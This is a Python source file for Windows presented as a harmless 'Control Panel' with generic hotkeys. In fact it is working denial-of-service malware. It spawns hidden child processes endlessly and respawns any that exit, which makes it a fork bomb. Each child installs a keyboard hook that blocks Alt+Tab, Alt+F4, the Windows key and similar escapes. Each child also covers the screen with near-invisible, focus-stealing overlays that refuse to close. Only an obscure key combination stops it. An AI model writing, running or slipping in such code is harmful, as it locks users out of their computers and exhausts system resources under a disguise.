import ctypes
import ctypes.wintypes as wintypes
import os
import subprocess
import sys
import threading
import time
import tkinter as tk
import random

items = [
    "hello", "world", "python", "banana", "cloud",
    "window", "coffee", "magic", "random", "infinite"
]

MOD_ALT = 0x0001
MOD_CONTROL = 0x0002
MOD_SHIFT = 0x0004
WM_HOTKEY = 0x0312

# Hotkey bindings are intentionally generic.
_mode_key = (MOD_CONTROL | MOD_ALT | MOD_SHIFT, 0x7A)  # Ctrl+Alt+Shift+F11
_stop_key = (MOD_CONTROL | MOD_ALT | MOD_SHIFT, 0x7B)  # Ctrl+Alt+Shift+F12
_CREATE_NO_WINDOW = 0x08000000

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_SYSKEYDOWN = 0x0104
VK_TAB = 0x09
VK_ESCAPE = 0x1B
VK_F4 = 0x73
VK_SPACE = 0x20
VK_LWIN = 0x5B
VK_RWIN = 0x5C
VK_CONTROL = 0x11
VK_MENU = 0x12

_hook = None
_hook_ptr = None


class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", wintypes.DWORD),
        ("scanCode", wintypes.DWORD),
        ("flags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", ctypes.wintypes.ULONG),
    ]

_shown = True
_layers = []


def _bind_hotkey(hotkey_id, modifiers, vk):
    return bool(ctypes.windll.user32.RegisterHotKey(None, hotkey_id, modifiers, vk))


def _release_hotkey(hotkey_id):
    ctypes.windll.user32.UnregisterHotKey(None, hotkey_id)


def _listen_for_hotkeys(callbacks, stop_event):
    msg = wintypes.MSG()
    user32 = ctypes.windll.user32
    while not stop_event.is_set():
        if user32.PeekMessageW(ctypes.byref(msg), None, 0, 0, 1):
            if msg.message == WM_HOTKEY:
                hotkey_id = msg.wParam
                if hotkey_id in callbacks:
                    callbacks[hotkey_id]()
            user32.TranslateMessage(ctypes.byref(msg))
            user32.DispatchMessageW(ctypes.byref(msg))
        else:
            time.sleep(0.01)


def _filter_keystrokes(nCode, wParam, lParam):
    if nCode >= 0 and wParam in (WM_KEYDOWN, WM_SYSKEYDOWN):
        kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
        vk = kb.vkCode
        alt_down = bool(ctypes.windll.user32.GetAsyncKeyState(VK_MENU) & 0x8000)
        ctrl_down = bool(ctypes.windll.user32.GetAsyncKeyState(VK_CONTROL) & 0x8000)

        if vk in (VK_LWIN, VK_RWIN):
            return 1
        if vk == VK_TAB and alt_down:
            return 1
        if vk == VK_F4 and alt_down:
            return 1
        if vk == VK_ESCAPE and (ctrl_down or alt_down):
            return 1
        if vk == VK_SPACE and alt_down:
            return 1

    return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)


def _enable_hook():
    global _hook, _hook_ptr
    if _hook:
        return
    HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.wintypes.WPARAM, ctypes.wintypes.LPARAM)
    _hook_ptr = HOOKPROC(_filter_keystrokes)
    _hook = ctypes.windll.user32.SetWindowsHookExW(WH_KEYBOARD_LL, _hook_ptr, ctypes.windll.kernel32.GetModuleHandleW(None), 0)
    if not _hook:
        print("Warning: keyboard hook installation failed")


def _disable_hook():
    global _hook, _hook_ptr
    if _hook:
        ctypes.windll.user32.UnhookWindowsHookEx(_hook)
        _hook = None
        _hook_ptr = None


def _is_interactive_environment():
    return bool(getattr(sys, 'ps1', False) or sys.flags.interactive or 'idlelib' in sys.modules)


def _build_child_process_kwargs():
    kwargs = {
        'stdin': subprocess.DEVNULL,
        'stdout': subprocess.DEVNULL,
        'stderr': subprocess.DEVNULL,
        'close_fds': True,
    }
    if os.name == 'nt':
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        kwargs['startupinfo'] = startupinfo
        kwargs['creationflags'] = _CREATE_NO_WINDOW
    return kwargs


class HotkeyManager:
    def __init__(self, registrations):
        self._registrations = registrations
        self._callbacks = {}
        self._registered_ids = []
        self._stop_event = threading.Event()
        self._thread = None

    def start(self):
        for hotkey_id, (modifiers, vk, callback) in self._registrations.items():
            if _bind_hotkey(hotkey_id, modifiers, vk):
                self._callbacks[hotkey_id] = callback
                self._registered_ids.append(hotkey_id)
            else:
                print(f"Warning: hotkey registration failed for id {hotkey_id}. This hotkey is disabled.")
        if self._callbacks:
            self._thread = threading.Thread(target=_listen_for_hotkeys, args=(self._callbacks, self._stop_event), daemon=True)
            self._thread.start()

    def stop(self):
        self._stop_event.set()
        if self._thread is not None:
            self._thread.join(timeout=1.0)
        for hotkey_id in self._registered_ids:
            _release_hotkey(hotkey_id)


def _close_overlay(win):
    if win in _layers:
        _layers.remove(win)
    try:
        win.destroy()
    except Exception:
        pass


def _open_overlay(root):
    if not _shown:
        return

    screen_w = root.winfo_screenwidth()
    screen_h = root.winfo_screenheight()

    win = tk.Toplevel(root)
    win.overrideredirect(True)
    win.attributes("-topmost", True)
    win.attributes("-toolwindow", True)
    win.attributes("-alpha", 0.01)
    win.config(bg="black")
    try:
        win.attributes("-fullscreen", True)
    except Exception:
        win.geometry(f"{screen_w}x{screen_h}+0+0")
    win.lift()
    win.focus_force()
    win.protocol("WM_DELETE_WINDOW", lambda: None)
    win.bind("<FocusOut>", lambda e, w=win: w.lift() or w.focus_force())
    win.after(100, lambda w=win: _guard_overlay(w))
    _layers.append(win)


def _sync_visibility(root):
    if _shown:
        root.withdraw()
        while len(_layers) < 2:
            _open_overlay(root)
    else:
        for win in list(_layers):
            _close_overlay(win)
        root.withdraw()


def _flip_visibility(root):
    global _shown
    _shown = not _shown
    root.after(0, lambda: _sync_visibility(root))


def run_panel():
    root = tk.Tk()
    root.title("Control Panel")
    root.geometry("400x200")
    root.withdraw()

    status_label = tk.Label(root, text="This panel is hidden by default. Use the hotkey to switch view.", wraplength=380)
    status_label.pack(expand=True, fill="both", padx=20, pady=20)

    def _refresh_status():
        status_label.config(text="Shown" if _shown else "Hidden")
        root.after(500, _refresh_status)

    _refresh_status()
    print("Panel running; use the hotkey to switch the view.")

    listener = HotkeyManager({
        1: (_mode_key[0], _mode_key[1], lambda: _flip_visibility(root))
    })
    listener.start()
    _enable_hook()

    _sync_visibility(root)
    root.after(100, lambda: _refresh_overlays(root))
    try:
        root.mainloop()
    finally:
        listener.stop()
        _disable_hook()


def _worker_loop(root):
    while True:
        time.sleep(0.1)


def _refresh_overlays(root):
    if _shown:
        if len(_layers) < 2:
            _open_overlay(root)
        for win in list(_layers):
            if win.winfo_exists():
                try:
                    win.lift()
                    win.focus_force()
                except Exception:
                    pass
            else:
                _close_overlay(win)
    root.after(100, lambda: _refresh_overlays(root))


def _guard_overlay(win):
    if win.winfo_exists():
        try:
            win.lift()
            win.focus_force()
        except Exception:
            return
        win.after(50, lambda w=win: _guard_overlay(w))


def _burn_cycles():
    while True:
        x = 0
        for i in range(1000000):
            x += i ^ (i << 1)


def _launch_children(script_path, process_kwargs):
    processes = []
    while True:
        try:
            child = subprocess.Popen(
                [sys.executable, script_path, "--child"],
                **process_kwargs,
            )
            processes.append(child)
            if len(processes) % 25 == 0:
                print(f"Spawned {len(processes)} child processes...")
            time.sleep(0.01)
        except OSError as exc:
            print(f"Stopped spawning after {len(processes)} processes: {exc}")
            break
    return processes


def monitor_loop():
    print("Monitor active. Launching child processes.")
    script_path = os.path.abspath(__file__)
    shutdown_requested = False

    def _request_shutdown():
        nonlocal shutdown_requested
        shutdown_requested = True

    listener = HotkeyManager({
        2: (_stop_key[0], _stop_key[1], _request_shutdown)
    })
    listener.start()

    try:
        process_kwargs = _build_child_process_kwargs()
        processes = _launch_children(script_path, process_kwargs)
        while not shutdown_requested:
            for index, child in enumerate(processes):
                if shutdown_requested:
                    break
                if child.poll() is not None:
                    try:
                        processes[index] = subprocess.Popen(
                            [sys.executable, script_path, "--child"],
                            **process_kwargs,
                        )
                    except OSError:
                        pass
            time.sleep(0.2)
    finally:
        listener.stop()
        for child in processes:
            try:
                child.terminate()
            except Exception:
                pass


if __name__ == "__main__":
    if "--child" in sys.argv:
        run_panel()
    else:
        monitor_loop()
